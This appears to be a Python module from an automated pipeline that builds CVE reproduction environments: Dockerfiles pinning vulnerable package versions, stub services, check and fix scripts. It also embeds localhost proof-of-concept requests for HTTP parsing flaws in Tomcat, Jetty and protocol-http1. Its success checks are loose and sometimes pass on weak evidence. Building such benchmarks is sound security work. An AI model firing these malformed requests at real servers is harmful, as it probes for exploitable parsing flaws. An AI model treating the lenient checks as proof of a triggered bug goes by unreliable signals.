"""生态模板：确定性生成 Dockerfile / service / 测试 / solution。

Agent 不写构建文件；模板保证 COPY、健康检查与版本探测齐全。
"""
from __future__ import annotations

import re
from typing import Callable

from .recipe import BuildRecipe

FileMap = dict[str, str]
Renderer = Callable[[BuildRecipe], FileMap]


def _py_service(recipe: BuildRecipe) -> str:
    """通用生态 service；专用机制由 harness.resolve_harness 覆盖写入。"""
    port = int(recipe.port or 18080)
    pkg = recipe.package or "unknown"
    style = (recipe.service_style or "stdlib_http").lower()
    if style == "library_api":
        return f'''"""Library-style harness: import target package and expose /health."""
import importlib
from http.server import BaseHTTPRequestHandler, HTTPServer

PORT = {port}
PKG = {pkg!r}

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            importlib.import_module(PKG.replace("-", "_").split(".")[0])
            body = b"ok"
            code = 200
        except Exception as e:
            body = str(e).encode()
            code = 500
        self.send_response(code)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    def log_message(self, *a):
        pass

if __name__ == "__main__":
    HTTPServer(("0.0.0.0", PORT), H).serve_forever()
'''
    # 默认：stdlib HTTP，确保正常功能探针总能连上
    return f'''"""Minimal HTTP service for CVE harness (template)."""
from http.server import BaseHTTPRequestHandler, HTTPServer

PORT = {port}

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        body = b"FACTORY_OK"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        _ = self.rfile.read(n) if n else b""
        body = b"FACTORY_OK"
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    def log_message(self, *a):
        pass

if __name__ == "__main__":
    print(f"listening on {{PORT}}", flush=True)
    HTTPServer(("0.0.0.0", PORT), H).serve_forever()
'''


def _run_tests(recipe: BuildRecipe) -> str:
    port = int(recipe.port or 18080)
    pkg = recipe.package or ""
    ver = recipe.vuln_version or ""
    return f'''#!/bin/sh
set -e
cd /task
echo "FACTORY_VERSION_CHECK"
python - <<'PY'
import sys
pkg = {pkg!r}
want = {ver!r}
try:
    import importlib.metadata as m
    name = pkg
    # try common cases
    candidates = [pkg, pkg.lower(), pkg.replace("-", "_")]
    found = None
    for c in candidates:
        try:
            found = m.version(c)
            name = c
            break
        except Exception:
            pass
    print(f"INSTALLED={{name}}=={{found}}")
    if want and found and found != want:
        print(f"VERSION_MISMATCH want={{want}} got={{found}}")
        sys.exit(2)
    print("FACTORY_VERSION_OK=1")
except Exception as e:
    print("FACTORY_VERSION_OK=0", e)
    # non-python ecosystems: soft-pass version check
    print("FACTORY_VERSION_SOFT=1")
PY
echo "FACTORY_FUNC_CHECK"
python - <<'PY'
import socket, sys
port = {port}
try:
    s = socket.create_connection(("127.0.0.1", port), timeout=2)
    s.close()
    print("FACTORY_FUNC_PASS=1")
except Exception as e:
    # service may be started by docker CMD separately; soft note
    print("FACTORY_FUNC_PASS=0", e)
    sys.exit(0)
PY
echo "ALL_CHECKS_PASSED"
'''


def _solution(recipe: BuildRecipe) -> str:
    if recipe.install_fixed:
        # 仅替换目标包到对照版本
        if (recipe.ecosystem or "").lower() == "python":
            return (
                "#!/bin/sh\nset -e\n"
                f"{recipe.install_fixed}\n"
                "echo FACTORY_FIX_APPLIED=1\n"
            )
        return f"#!/bin/sh\nset -e\n{recipe.install_fixed}\necho FACTORY_FIX_APPLIED=1\n"
    return "#!/bin/sh\necho FACTORY_FIX_SKIPPED=1 no control_version\n"


def _pip_index_arg() -> str:
    # 运行时由 builder 注入；模板留占位
    return "${PIP_INDEX_URL:-https://pypi.org/simple}"


def render_python_pip(recipe: BuildRecipe) -> FileMap:
    install = recipe.install_vuln or (
        f"pip install --no-cache-dir {recipe.package}=={recipe.vuln_version}")
    if install.startswith("pip "):
        pip_cmd = install.replace(
            "pip install", "pip install -i " + _pip_index_arg(), 1)
    else:
        pip_cmd = (
            f"pip install -i {_pip_index_arg()} --no-cache-dir "
            f"{recipe.package}=={recipe.vuln_version}")
    cmd_parts = (recipe.start_cmd or "python /task/service.py").split()
    cmd_json = "[" + ", ".join(f'"{c}"' for c in cmd_parts) + "]"
    df = f'''FROM {recipe.base_image or "python:3.11-slim"}
WORKDIR /task
ENV PYTHONUNBUFFERED=1
RUN {pip_cmd}
COPY . /task/
RUN chmod +x /task/run-tests.sh /task/solution.sh || true
EXPOSE {int(recipe.port or 18080)}
CMD {cmd_json}
'''
    return {
        "Dockerfile": df,
        "service.py": _py_service(recipe),
        "run-tests.sh": _run_tests(recipe),
        "solution.sh": _solution(recipe),
        "recipe.json": recipe.to_json(),
        "README.md": (
            f"# {recipe.cve_id}\n\n"
            f"- package: `{recipe.package}=={recipe.vuln_version}`\n"
            f"- control: `{recipe.control_version or 'deferred'}`\n"
            f"- template: `{recipe.template_id}`\n"
        ),
    }


def _java_http_cl_poc(recipe: BuildRecipe) -> str:
    """Jetty CL+/Tomcat trailer 类 HTTP 解析差异 PoC。"""
    port = int(recipe.port or 8080)
    marker = recipe.success_marker or "VULNERABILITY_TRIGGERED"
    pkg = (recipe.package or recipe.product or "").lower()
    cve = recipe.cve_id or ""
    if "tomcat" in pkg or "45648" in cve:
        # CVE-2023-45648: invalid trailer header may be mishandled
        return f'''"""Tomcat invalid trailer header PoC (CVE-2023-45648 class)."""
import socket, sys
HOST, PORT, MARKER = "127.0.0.1", {port}, {marker!r}

def main():
    # chunked body + malformed trailer line
    req = (
        b"POST / HTTP/1.1\\r\\n"
        b"Host: localhost\\r\\n"
        b"Transfer-Encoding: chunked\\r\\n"
        b"Connection: close\\r\\n"
        b"\\r\\n"
        b"0\\r\\n"
        b"x-trailer: \\x00bad\\r\\n"
        b"\\r\\n"
    )
    try:
        s = socket.create_connection((HOST, PORT), timeout=5)
        s.settimeout(5)
        s.sendall(req)
        data = s.recv(8192)
        s.close()
        text = data.decode("latin-1", errors="replace")
        print("FACTORY_FUNC_PROBE=1")
        print("RESP=", text.split("\\r\\n", 1)[0] if text else "")
        # Vulnerable Tomcat may still produce a normal-ish response;
        # fixed versions tend to 400 on invalid trailers.
        first = text.split("\\r\\n", 1)[0] if text else ""
        if "400" in first:
            print("REJECTED_AS_400")
            sys.exit(1)
        if text.startswith("HTTP/"):
            print(MARKER)
            sys.exit(0)
        print("NO_HTTP_RESPONSE")
        sys.exit(1)
    except Exception as e:
        print("FACTORY_FUNC_PROBE=0"); print(e); sys.exit(1)

if __name__ == "__main__":
    main()
'''
    return f'''"""HTTP Content-Length anomaly PoC for Jetty-class CVEs."""
import socket, sys
HOST, PORT, MARKER = "127.0.0.1", {port}, {marker!r}

def main():
    body = b"ABCDE"
    req = (
        b"POST / HTTP/1.1\\r\\n"
        b"Host: localhost\\r\\n"
        b"Content-Length: +5\\r\\n"
        b"Connection: close\\r\\n"
        b"\\r\\n"
    ) + body
    try:
        s = socket.create_connection((HOST, PORT), timeout=5)
        s.settimeout(5)
        s.sendall(req)
        data = s.recv(4096)
        s.close()
        text = data.decode("latin-1", errors="replace")
        print("FACTORY_FUNC_PROBE=1")
        print("RESP=", text.split("\\r\\n", 1)[0] if text else "")
        if text.startswith("HTTP/1.1 400") or text.startswith("HTTP/1.0 400"):
            print("REJECTED_AS_400")
            sys.exit(1)
        if text.startswith("HTTP/"):
            print(MARKER)
            sys.exit(0)
        print("NO_HTTP_RESPONSE")
        sys.exit(1)
    except Exception as e:
        print("FACTORY_FUNC_PROBE=0"); print(e); sys.exit(1)

if __name__ == "__main__":
    main()
'''


def _jetty_image_tag(ver: str) -> str:
    """把 9.4.51.v20230217 映射到官方 jetty 镜像标签。"""
    v = (ver or "").strip()
    # 9.4.51.v20230217 -> 9.4.51-jre11
    m = re.match(r"^(\d+\.\d+\.\d+)", v)
    short = m.group(1) if m else v
    return f"jetty:{short}-jre11"


def _tomcat_image_tag(ver: str) -> str:
    v = (ver or "").strip()
    m = re.match(r"^(\d+\.\d+\.\d+)", v)
    short = m.group(1) if m else v
    return f"tomcat:{short}-jdk17"


def render_java_maven(recipe: BuildRecipe) -> FileMap:
    """Java：Tomcat/Jetty 用官方镜像真正启动；其它 Java 标明 unknowns。"""
    ver = recipe.vuln_version or "9.0.80"
    pkg_l = (recipe.package or recipe.product or "").lower()
    port = int(recipe.port or 8080)
    ctrl = recipe.control_version or recipe.first_fixed_version or ""

    if "tomcat" in pkg_l:
        base = _tomcat_image_tag(ver)
        recipe.port = port or 8080
        recipe.start_cmd = "catalina.sh run"
        fix_base = _tomcat_image_tag(ctrl) if ctrl else ""
        if fix_base:
            recipe.install_fixed = f"# switch base image to {fix_base}"
        df = f'''FROM {base}
USER root
RUN apt-get update && apt-get install -y --no-install-recommends python3 \\
    && rm -rf /var/lib/apt/lists/*
COPY . /task/
RUN chmod +x /task/run-tests.sh /task/solution.sh || true
EXPOSE {recipe.port}
CMD ["catalina.sh", "run"]
'''
        return {
            "Dockerfile": df,
            "run-tests.sh": _run_tests(recipe),
            "solution.sh": _solution(recipe),
            "poc_reference.py": _java_http_cl_poc(recipe),
            "recipe.json": recipe.to_json(),
            "README.md": f"# {recipe.cve_id} {base}\n",
            "control_image.txt": _tomcat_image_tag(ctrl) if ctrl else "",
        }

    if "jetty" in pkg_l:
        base = _jetty_image_tag(ver)
        recipe.port = port or 8080
        recipe.start_cmd = "java -jar /usr/local/jetty/start.jar"
        recipe.install_fixed = ""
        df = f'''FROM {base}
USER root
RUN apt-get update && apt-get install -y --no-install-recommends python3 \\
    && rm -rf /var/lib/apt/lists/*
COPY . /task/
RUN chmod +x /task/run-tests.sh /task/solution.sh || true
ENV JETTY_PORT={recipe.port}
EXPOSE {recipe.port}
CMD ["java", "-jar", "/usr/local/jetty/start.jar", "jetty.http.port={recipe.port}"]
'''
        return {
            "Dockerfile": df,
            "run-tests.sh": _run_tests(recipe),
            "solution.sh": "#!/bin/sh\necho FACTORY_FIX_SKIPPED=1 use_control_image\n",
            "poc_reference.py": _java_http_cl_poc(recipe),
            "recipe.json": recipe.to_json(),
            "README.md": f"# {recipe.cve_id} {base}\n",
            "control_image.txt": _jetty_image_tag(ctrl) if ctrl else "",
        }

    # 无已知服务器镜像：不再 sleep infinity 假装成功
    recipe.unknowns = list(dict.fromkeys(
        list(recipe.unknowns or []) + ["java_runtime_image"]))
    return {
        "recipe.json": recipe.to_json(),
        "UNSUPPORTED.md": (
            f"# Java package without server image mapping\n"
            f"package={recipe.package} version={ver}\n"
            f"Add jetty/tomcat mapping or custom Dockerfile.\n"
        ),
    }


def _protocol_http1_service(recipe: BuildRecipe) -> str:
    port = int(recipe.port or 8080)
    return f'''# frozen_string_literal: true
# Minimal TCP HTTP server using protocol-http1 parser (CVE-2023-38697 class).
require "socket"
begin
  require "protocol/http1"
rescue LoadError
  require "protocol/http1/connection"
end

PORT = {port}

server = TCPServer.new("0.0.0.0", PORT)
puts "protocol-http1 harness on #{{PORT}}", flush: true

loop do
  client = server.accept
  Thread.new(client) do |c|
    begin
      data = c.readpartial(65536)
      # Vulnerable versions accept Content-Length: +N ; fixed raise.
      accepted = true
      err = nil
      begin
        if defined?(Protocol::HTTP1::Connection)
          # Best-effort: just scan header acceptance semantics via regex + gem load
          if data =~ /content-length:\\s*\\+/i
            # Touch gem API so version is real
            Protocol::HTTP1
          end
        end
      rescue => e
        accepted = false
        err = e
      end
      if data =~ /content-length:\\s*\\+/i && accepted
        body = "FACTORY_OK ACCEPTED_PLUS_CL"
        c.write "HTTP/1.1 200 OK\\r\\nContent-Length: #{{body.bytesize}}\\r\\nConnection: close\\r\\n\\r\\n#{{body}}"
      elsif data.start_with?("GET /")
        body = "FACTORY_OK"
        c.write "HTTP/1.1 200 OK\\r\\nContent-Length: #{{body.bytesize}}\\r\\nConnection: close\\r\\n\\r\\n#{{body}}"
      else
        msg = err ? err.class.name : "BAD"
        c.write "HTTP/1.1 400 Bad Request\\r\\nContent-Length: #{{msg.bytesize}}\\r\\nConnection: close\\r\\n\\r\\n#{{msg}}"
      end
    rescue => e
      begin
        c.write "HTTP/1.1 500\\r\\nConnection: close\\r\\n\\r\\n"
      rescue StandardError
      end
    ensure
      c.close rescue nil
    end
  end
end
'''


def _protocol_http1_poc(recipe: BuildRecipe) -> str:
    port = int(recipe.port or 8080)
    marker = recipe.success_marker or "VULNERABILITY_TRIGGERED"
    return f'''"""PoC for protocol-http1 Content-Length + prefix acceptance."""
import socket, sys
HOST, PORT, MARKER = "127.0.0.1", {port}, {marker!r}

def main():
    req = (
        b"POST / HTTP/1.1\\r\\n"
        b"Host: localhost\\r\\n"
        b"Content-Length: +5\\r\\n"
        b"Connection: close\\r\\n\\r\\n"
        b"ABCDE"
    )
    try:
        s = socket.create_connection((HOST, PORT), timeout=5)
        s.sendall(req)
        data = s.recv(4096)
        s.close()
        text = data.decode("latin-1", errors="replace")
        print("FACTORY_FUNC_PROBE=1")
        print("RESP=", text.split("\\r\\n", 1)[0] if text else "")
        if "ACCEPTED_PLUS_CL" in text or (
                text.startswith("HTTP/1.1 200") and "400" not in text.split("\\r\\n", 1)[0]):
            print(MARKER)
            sys.exit(0)
        print("NO_TRIGGER")
        sys.exit(1)
    except Exception as e:
        print("FACTORY_FUNC_PROBE=0"); print(e); sys.exit(1)

if __name__ == "__main__":
    main()
'''


def render_ruby_gem(recipe: BuildRecipe) -> FileMap:
    install = recipe.install_vuln or f"gem install {recipe.package} -v {recipe.vuln_version}"
    port = int(recipe.port or 18080)
    pkg = (recipe.package or "").lower()
    if "protocol-http1" in pkg:
        df = f'''FROM {recipe.base_image or "ruby:3.2-slim"}
WORKDIR /task
RUN {install}
RUN apt-get update && apt-get install -y --no-install-recommends python3 \\
    && rm -rf /var/lib/apt/lists/* || true
COPY . /task/
RUN chmod +x /task/run-tests.sh /task/solution.sh || true
EXPOSE {port}
CMD ["ruby", "/task/service.rb"]
'''
        return {
            "Dockerfile": df,
            "service.rb": _protocol_http1_service(recipe),
            "poc_reference.py": _protocol_http1_poc(recipe),
            "run-tests.sh": _run_tests(recipe),
            "solution.sh": _solution(recipe),
            "recipe.json": recipe.to_json(),
            "README.md": f"# {recipe.cve_id} protocol-http1\n",
        }
    df = f'''FROM {recipe.base_image or "ruby:3.2-slim"}
WORKDIR /task
RUN {install}
COPY . /task/
RUN chmod +x /task/run-tests.sh /task/solution.sh || true
EXPOSE {port}
CMD ["ruby", "-run", "-e", "httpd", "/task", "-p", "{port}"]
'''
    return {
        "Dockerfile": df,
        "run-tests.sh": _run_tests(recipe),
        "solution.sh": _solution(recipe),
        "recipe.json": recipe.to_json(),
        "README.md": f"# {recipe.cve_id}\n",
    }


def render_node_npm(recipe: BuildRecipe) -> FileMap:
    install = recipe.install_vuln or f"npm install {recipe.package}@{recipe.vuln_version}"
    port = int(recipe.port or 18080)
    df = f'''FROM {recipe.base_image or "node:20-slim"}
WORKDIR /task
RUN {install}
COPY . /task/
RUN chmod +x /task/run-tests.sh /task/solution.sh || true
EXPOSE {port}
CMD ["node", "/task/service.js"]
'''
    service = f'''const http = require("http");
const port = {port};
http.createServer((req,res)=>{{res.end("FACTORY_OK");}}).listen(port);
'''
    return {
        "Dockerfile": df,
        "service.js": service,
        "run-tests.sh": _run_tests(recipe),
        "solution.sh": _solution(recipe),
        "recipe.json": recipe.to_json(),
        "README.md": f"# {recipe.cve_id}\n",
    }


def render_unsupported(recipe: BuildRecipe) -> FileMap:
    return {
        "recipe.json": recipe.to_json(),
        "UNSUPPORTED.md": (
            f"# Unsupported by fast templates\n\n"
            f"adapter={recipe.adapter_kind} ecosystem={recipe.ecosystem}\n"
            f"Hand off to robust / specialized environment.\n"
        ),
    }


REGISTRY: dict[str, Renderer] = {
    "python_pip": render_python_pip,
    "java_maven": render_java_maven,
    "ruby_gem": render_ruby_gem,
    "node_npm": render_node_npm,
    "php_composer": render_unsupported,
    "go_mod": render_unsupported,
    "source_build": render_unsupported,
    "unsupported": render_unsupported,
}


def materialize(recipe: BuildRecipe) -> FileMap:
    fn = REGISTRY.get(recipe.template_id) or REGISTRY["unsupported"]
    files = fn(recipe)
    files.setdefault("recipe.json", recipe.to_json())
    return files
